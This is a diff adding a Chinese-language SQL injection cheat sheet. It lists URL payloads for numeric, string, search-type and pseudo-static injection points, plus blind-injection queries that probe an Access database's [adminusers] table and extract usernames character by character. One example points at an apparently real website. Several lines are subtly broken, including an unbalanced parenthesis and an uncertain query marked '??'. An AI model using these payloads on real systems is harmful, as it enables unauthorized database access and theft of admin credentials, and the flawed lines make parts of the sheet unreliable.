@@ -1,0 +1,48 @@
+数字型
+  www.xxx.com/new.asp?id=11
+  select * from news where id = 11
+
+  payload:
+  www.xxx.com/new.asp?id=11 and 1=1
+
+
+字符型
+  www.xxx.com/new.asp?name=Darkmoon
+  select * from news where name = 'Darkmoon'
+
+  payload:
+  www.xxx.com/new.asp?name=Darkmoon' and 1=1 '
+  www.xxx.com/new.asp?name=Darkmoon' and 1=1 #
+
+
+搜索型
+  www.xxx.com/new.asp?search=time
+  select * from news where keyword = "'like %$id%'"  //"%like $id%" ??
+
+  payload:
+  www.xxx.com/news.asp?search=time %' and 1=1 #
+  www.xxx.com/news.asp?search=time %' and 1=1 and '%'='
+
+  注入语句：
+  2%' and (select count(*) from [msysobjects])>0 and '%'='
+  2%' and (select count(*) from [adminusers])>0  and '%'='
+  2%' and (select count(username) from [adminusers])>0 and '%'='
+  2%' and (select top 1 len(username) from [adminusers])>4 and '%'='
+  2%' and (select top 1 asc(mid(username,1,1))) from [adminusers])>97 and '%'='
+
+伪静态
+  sample1:
+  http://www.xxx.com/index.php/Index/details/class/news/html/moving/id/1280.html
+ 
+  去掉最后的.html
+  http://www.xxx.com/index.php/Index/details/class/news/html/moving/id/1280  //回车没报错说明是伪静态
+  
+
+  注入:
+  http://www.xxx.com/index.php/Index/details/class/news/html/moving/id/1280 and 1=1   #没报错
+  http://www.xxx.com/index.php/Index/details/class/news/html/moving/id/1280 and 1=2   #报错说明有注入
+
+  sample2:
+  http://www.sybell.com.cn/jszx/kctx_9.html  改成
+  http://www.sybel1.com.cn/jszx/kctx.asp?id=9 
+  
